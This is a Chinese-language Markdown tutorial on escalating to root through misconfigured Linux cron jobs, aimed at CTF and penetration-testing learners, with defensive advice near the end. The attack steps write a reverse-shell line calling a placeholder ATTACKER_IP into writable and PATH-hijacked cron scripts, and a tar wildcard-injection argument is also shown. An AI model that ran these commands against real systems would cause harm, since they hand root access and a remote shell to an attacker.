# ⏰ Linux 權限提升技巧：Cron Jobs（定時任務）

## 📘 基本概念

- **Cron 作業（Cron jobs）** 是 Linux 系統中用來在指定時間自動執行指令或腳本的機制。
- 每個使用者都可設置自己的 `crontab`，但**Cron 作業會以該 crontab 所屬使用者的權限執行**。
- **攻擊重點在於：** 如果一個由 root 執行的 cron 任務中呼叫的腳本或程式可被低權限使用者修改，那麼該腳本就會以 root 權限被執行，可導致提權。

---

## 🎯 攻擊條件

1. 有一個由 root 執行的 cron 任務（可透過 `/etc/crontab` 或 `/etc/cron.d/` 等查看）
2. 任務中呼叫的腳本（如 `/opt/backup.sh`）可由低權限使用者編輯或覆寫
3. 任務會在短時間內執行（如每分鐘）

---


## 攻擊步驟
### 1. 🔍 檢查關鍵檔案與路徑

- 查看系統等級 cron 任務：
  
  ```bash
  cat /etc/crontab
  ls -l /etc/cron.d/
  ```

- 查看目前使用者 crontab 任務：

  ```bash
  crontab -l
  ```

- 檢查是否有可寫的 cron 腳本：

  ```bash
  find / -writable -name '*.sh' 2>/dev/null
  ```

---

### 2. 🛠 修改 cron 腳本取得 root 權限

1. 找到一個 root 執行的 cron 任務（如 `/opt/backup.sh` 每分鐘執行）
2. 檢查腳本是否可編輯：

   ```bash
   ls -l /opt/backup.sh
   ```

3. 修改該腳本注入反向 shell：

   ```bash
   echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" > /opt/backup.sh
   ```

4. 在攻擊機器啟動監聽：

   ```bash
   nc -lvnp PORT
   ```

5. 等待 cron 執行腳本，取得 root 權限 shell。

---

## 路徑漏洞濫用技巧（當腳本不存在）

### 範例情境：

- `/etc/crontab` 中有：

  ```
  * * * * * root antivirus.sh
  ```

- `antivirus.sh` 不存在，cron 會依 PATH 搜尋
- 可在 `/home/user/` 中建立可被搜尋到的 `antivirus.sh`

### 利用方式：

```bash
echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" > ~/antivirus.sh
chmod +x ~/antivirus.sh
```

當 cron 執行時就會跑這個假腳本。

---

## 🧨 常見錯誤配置導致漏洞

| 錯誤情況 | 說明 |
|----------|------|
| 指定了可被使用者寫入的腳本路徑 | 如 `/opt/backup.sh` 可被 `user` 寫入 |
| 腳本已被刪除，但 cron 任務仍存在 | 攻擊者可在 PATH 中建立同名腳本欺騙 cron |
| 未指定完整腳本路徑 | 導致 cron 依 PATH 執行可控的腳本 |

---

## 🧰 延伸利用：Wildcard Injection

- 若腳本中使用像 `tar`、`7z`、`rsync` 等工具，攻擊者可利用通配符注入方式提權。
- 例如：建立名稱特殊的檔案 `--checkpoint-action=exec=sh shell.sh`，執行 `tar` 時會觸發 `shell.sh`。

---

## 🛡 防禦建議

- 所有 cron 任務中的腳本應設為 **root-only 可寫**
- 定期清理不再使用的 cron 任務與腳本
- 指定腳本的完整路徑並確認檔案存在
- 限制使用者對於 `/etc/cron*` 目錄與任意執行檔的寫入權限

---

## ✅ 小結

- Cron 提權重點是：**由 root 執行、但腳本可被低權限使用者控制**
- 是許多 CTF 與真實世界滲透測試中常見的權限提升手法
- 配置錯誤（如腳本遺失、權限錯誤）是可被利用的主要原因

